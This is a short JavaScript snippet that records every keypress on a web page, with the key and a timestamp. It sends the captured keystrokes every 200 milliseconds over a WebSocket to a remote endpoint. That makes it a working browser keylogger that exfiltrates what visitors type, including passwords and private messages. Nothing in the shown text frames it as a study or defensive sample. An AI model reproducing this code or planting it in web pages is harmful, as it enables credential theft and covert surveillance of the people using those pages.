var buffer=[];
document.onkeypress = function(e) {
    var timestamp = Date.now() | 0;
    var stroke = {
        k: e.key,
        t: timestamp
    };
    buffer.push(stroke);
}

window.setInterval(function() {
    if (buffer.length > 0) {
        var data = JSON.stringify(buffer);
        ws.send(data);
        buffer = [];
    }
}, 200);
